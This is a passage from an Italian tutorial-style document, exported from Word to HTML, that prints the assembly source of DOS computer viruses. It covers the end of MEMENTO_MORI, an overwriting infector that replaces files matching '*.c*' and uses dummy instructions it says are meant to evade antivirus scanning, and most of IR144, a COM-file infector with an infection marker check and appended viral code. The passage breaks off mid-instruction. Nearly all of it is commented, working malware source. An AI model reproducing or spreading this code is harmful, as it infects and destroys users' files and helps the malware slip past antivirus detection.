<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>;<span style="mso-spacerun: yes">   </span>bit 6-15 = riservati<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; ponendo tutti i bytes di cx a zero viene indicato un file
qualsiasi, cioe'<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; senza attributi.<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">           </span>lea
dx,com_mask<span style="mso-spacerun: yes">      </span>; in ds:dx viene
inserito l'offset del nome<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">           </span>int 21h<span
style="mso-spacerun: yes">              </span>; del file da aprire: qualsiasi
file la<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">          </span><span
style="mso-spacerun: yes">                      </span>; cui estensione termina
con il carattere 'c'<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; le istruzioni che seguono non fanno nulla: servono unicamente
a mascherare<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; il codice contro la scansione dei software antivirus. Il
codice cresce cosi'<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; dagli originali 44 bytes dello standard Trivial a 76.<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">           </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>nop<span style="mso-spacerun: yes">  </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">           </span>mov ax,01h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">           </span>mov dx,02h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">           </span>jmp jump<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">           </span>nop<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>jump:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">           </span>mov ax,03h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">           </span>mov dx,04h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">           </span>nop<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; fine delle istruzioni dummy<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; al primo ciclo in dx abbiamo inserito in ds:dx il nome del
primo file *.c. <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; Ma come fa il programma a cercare il nome del secondo file
dopo l'istruzione<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; di next --&gt; mov ah,4fh che cerca il prossimo file ?<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; ecco la soluzione: la funzione 4fh aggiorna ad ogni nuova
apertura la DTA<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; che fra le altre cose contiene il nome del file da aprire.<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; la DTA (Disk Transfer Area) e' cosi' strutturata:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; offset<span style="mso-spacerun: yes">    </span>bytes<span
style="mso-spacerun: yes">      </span>contenuto<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>;<span style="mso-spacerun: yes">  </span>0<span
style="mso-spacerun: yes">          </span>21<span style="mso-spacerun:
yes">       </span>riservato<span style="mso-spacerun: yes">  </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>;<span style="mso-spacerun: yes">  </span>1<span
style="mso-spacerun: yes">           </span>1<span style="mso-spacerun:
yes">       </span>attributi del file<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; 22<span style="mso-spacerun: yes">           </span>2<span
style="mso-spacerun: yes">       </span>ora ultima modifica <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; 24<span style="mso-spacerun: yes">           </span>2<span
style="mso-spacerun: yes">       </span>data ultima modifica<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; 26<span style="mso-spacerun: yes">           </span>4<span
style="mso-spacerun: yes">       </span>misura del file in bytes<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; 30<span style="mso-spacerun: yes">          </span>13<span
style="mso-spacerun: yes">       </span>nome del file (ASCIIZ)<span
style="mso-spacerun: yes">  </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; per ricavare il nome del file devo saltare i primi 128 bytes<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; del PSP e puntare all'offset 30 della DTA. Quindi:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; 128 (80h) + 30 (1e) = 158 (9eh)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">            </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>apri:<span style="mso-spacerun: yes">      </span>mov
ax,3d02h<span style="mso-spacerun: yes">         </span>; apro il file in
lettura/scrittura<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">           </span>mov
dx,9eh<span style="mso-spacerun: yes">           </span>; ricavo il nome del
file dalla DTA <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">           </span>int 21h<span
style="mso-spacerun: yes">              </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">           </span>nop<span
style="mso-spacerun: yes">          </span><span style="mso-spacerun:
yes">        </span>; istruzione dummy <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>infetta:<span style="mso-spacerun: yes">   </span>mov
cx,len<span style="mso-spacerun: yes">           </span>; scrivo il codice
virale all'inizio del file<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">           </span>lea
dx,start<span style="mso-spacerun: yes">         </span>; in CX numero di bytes
da scrivere<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">           </span>mov
ah,40h<span style="mso-spacerun: yes">           </span>; in DS:DX dati da
scrivere (codice virale)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">     </span><span
style="mso-spacerun: yes">      </span>int 21h<span style="mso-spacerun:
yes">              </span>; <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">           </span>nop<span
style="mso-spacerun: yes">                  </span>; istruzione dummy<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>prossimo:<span style="mso-spacerun: yes">  </span>mov
ah,3eh<span style="mso-spacerun: yes">           </span>; chiudo il file<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">           </span>int 21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">           </span>mov
ah,4fh<span style="mso-spacerun: yes">           </span>; cerco il prossimo
file e aggiorno la DTA<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">           </span>int 21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">           </span>jnb apri<span
style="mso-spacerun: yes">             </span>; ci sono ancora files ?<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>com_mask:<span style="mso-spacerun: yes">  </span>db
&quot;*.c*&quot;,0<span style="mso-spacerun: yes">          </span>; maschera
di ricerca per l'estensione<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>sign:<span style="mso-spacerun: yes">      </span>db
&quot;memento mori$&quot;<span style="mso-spacerun: yes">   </span>; firma<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>last:<span style="mso-spacerun: yes">                          
</span>; etichetta dummy per la dimensione del codice<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>virus ends<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     
</span>end start<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; fine sorgente di MEMENTO_MORI<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>;***********************************************************************************
<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-size:
12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>II° Esempio<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-size:
12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>IR144 - Virus COM-infettore non sovrascrittore.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>.model tiny <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>.radix 16<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>.code<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>org 100<span
style="mso-spacerun: yes">                    </span><span style="mso-spacerun:
yes">   </span>;è un programma COM<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>start:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>call<span style="mso-spacerun: yes">    </span>get_offset<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>get_offset:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>pop<span
style="mso-spacerun: yes">     </span>bp<span style="mso-spacerun:
yes">                    </span>; ricava l’indirizzo “delta”<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>sub<span style="mso-spacerun: yes">     </span>bp,offset get_offset<span
style="mso-spacerun: yes">  </span>; <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span></span></b><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>lea<span style="mso-spacerun: yes">    
</span>si,[bp+salva_bytes]<span style="mso-spacerun: yes">   </span>;
ripristina i primi 4 bytes dell’host<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>mov<span
style="mso-spacerun: yes">     </span>di,100h<span style="mso-spacerun:
yes">               </span>; prima di rilasciargli il controllo<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>movsw<span
style="mso-spacerun: yes">                         </span>; i primi 2 bytes da
si a di (100h)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>movsw<span
style="mso-spacerun: yes">                         </span>; i rimanenti 2 bytes
da si a di<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>lea<span
style="mso-spacerun: yes">     </span>dx,[bp+end_virus]<span
style="mso-spacerun: yes">  </span><span style="mso-spacerun: yes">   </span>;
setta il DTA ponendola alla fine<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>mov<span
style="mso-spacerun: yes">     </span>ah,1ah<span style="mso-spacerun:
yes">                </span>; del codice virale<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>int<span
style="mso-spacerun: yes">     </span>21<span style="mso-spacerun:
yes">                    </span>; funzione 1ah<span style="mso-spacerun: yes"> 
</span>INT 21: setta DTA<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>lea<span
style="mso-spacerun: yes">     </span>dx,[bp+find_files]<span
style="mso-spacerun: yes">    </span>; cerchiamo solo file &quot;*.com&quot;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>mov<span
style="mso-spacerun: yes">     </span>ah,4eh<span style="mso-spacerun:
yes">                </span>; cerca il primo nella dir.corrente<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>find_next:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>int<span style="mso-spacerun: yes">     </span>21<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span></span></b><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>jc<span style="mso-spacerun: yes">      </span>reset_DTA<span
style="mso-spacerun: yes">      </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>lea<span
style="mso-spacerun: yes">     </span>dx,[bp+end_virus+1eh] ; nome del file
nella DTA (1eh = 30 dec.)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>mov<span
style="mso-spacerun: yes">     </span>ax,3d02h<span style="mso-spacerun:
yes">              </span>; apro il file. in AX l’handle del file<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>int<span
style="mso-spacerun: yes">     </span>21<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>jc<span
style="mso-spacerun: yes">      </span>ancora<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>xchg<span
style="mso-spacerun: yes">    </span>bx,ax<span style="mso-spacerun:
yes">                 </span>; ora handle del file in BX<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>mov<span
style="mso-spacerun: yes">     </span>cx,4<span style="mso-spacerun:
yes">                  </span>; leggiamo I primi 4 bytes<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>mov<span
style="mso-spacerun: yes">     </span>ah,3fh<span style="mso-spacerun:
yes">                </span>; 3FH funzione di lettura dell’INT 21H<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>lea<span
style="mso-spacerun: yes">     </span>dx,[bp+salva_bytes]<span
style="mso-spacerun: yes">   </span>; e li salviamo in salva_bytes<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>int<span
style="mso-spacerun: yes">     </span>21<span style="mso-spacerun:
yes">                    </span>; <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>cmp<span
style="mso-spacerun: yes">     </span>byte ptr [salva_bytes+bp+3],'V'<span
style="mso-spacerun: yes">   </span>; è già stato infettato ?<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>jz<span
style="mso-spacerun: yes">      </span>chiudi<span style="mso-spacerun:
yes">                          </span>; già infettato. cerca ancora<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun:
yes">                                                  </span>; se passa qui
non è infettato<span style="mso-spacerun: yes">  </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>mov<span
style="mso-spacerun: yes">     </span>ax,4202<span style="mso-spacerun:
yes">                           </span>; vai alla fine del file (EOF)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>sub<span style="mso-spacerun: yes">     </span>cx,cx<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>cwd<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span></span></b><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>int<span style="mso-spacerun: yes">     </span>21<span
style="mso-spacerun: yes">         </span><span style="mso-spacerun:
yes">                       </span>; ora in AX=posizione di EOF<span
style="mso-spacerun: yes">   </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>sub<span
style="mso-spacerun: yes">     </span>ax,3<span style="mso-spacerun:
yes">                              </span>; togliamo I 3 bytes del JMP<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>mov<span
style="mso-spacerun: yes">     </span>word ptr [bp+salta_bytes+1],ax<span
style="mso-spacerun: yes">    </span>; li inseriamo nel nostro buffer<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>mov<span
style="mso-spacerun: yes">     </span>ah,40h<span style="mso-spacerun:
yes">               </span><span style="mso-spacerun:
yes">             </span>; scriviamo il codice virale<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>mov<span
